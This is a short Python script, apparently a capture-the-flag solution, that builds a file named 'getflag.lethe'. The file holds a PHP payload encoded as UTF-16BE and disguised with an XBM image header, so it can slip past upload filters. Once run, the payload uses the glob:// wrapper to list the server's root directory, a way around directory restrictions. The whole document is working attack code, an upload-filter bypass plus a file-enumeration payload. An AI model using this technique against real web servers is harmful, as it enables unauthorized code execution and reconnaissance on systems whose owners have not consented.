SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
	phpfile = open(filename, 'wb') 

	phpfile.write(script.encode('utf-16be'))
	phpfile.write(SIZE_HEADER)

	phpfile.close()
generate_php_file("getflag.lethe", "$a = 'glob:///*';if ( $b = opendir($a) ) {while ( ($file = readdir($b)) !== false ) {echo 'filename:'.$file.\"\n\";}closedir($b);}")